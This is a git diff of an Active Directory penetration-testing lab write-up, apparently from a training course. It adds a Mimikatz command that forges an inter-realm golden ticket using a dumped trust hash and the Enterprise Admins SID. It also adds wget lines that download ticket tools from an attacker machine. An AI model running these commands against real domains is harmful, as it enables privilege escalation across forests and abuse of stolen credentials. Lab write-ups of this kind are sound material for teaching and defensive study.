@@ -169,8 +169,20 @@ To forge inter-realm TGT, we need the following information:
   - Dumped using DCSync: `72cc4221252de3dfd2b5446f5b8c0f10`
 
 
-
+Use the following command to forge a inter-realm TGT:
 
 ```
-Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-3757735274-1965336150-1982876978 /sids:<sid_of_enterprise_admins_group_of_parent_domain>-519 /rc4:72cc4221252de3dfd2b5446f5b8c0f10 /service:krbtgt /target:atomic.site /ticket:C:\Users\Public\forged.kirbi
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-3757735274-1965336150-1982876978 /sids:S-1-5-21-95921459-2896253700-387377905-519 /rc4:72cc4221252de3dfd2b5446f5b8c0f10 /service:krbtgt /target:atomic.site /ticket:C:\Users\Public\forged.kirbi"'
 ```
+
+![picture 52](images/75213d508181da8b5844a14b4b9930f63dccd389dbc3c0a39b7d8671d46756bf.png)  
+
+<br/>
+
+Download two more tools from the attacker machine:
+
+```
+wget http://192.168.100.11/asktgs.exe -OutFile .\asktgs.exe
+wget http://192.168.100.11/kirbikator.exe -OutFile .\kirbikator.exe
+```
+
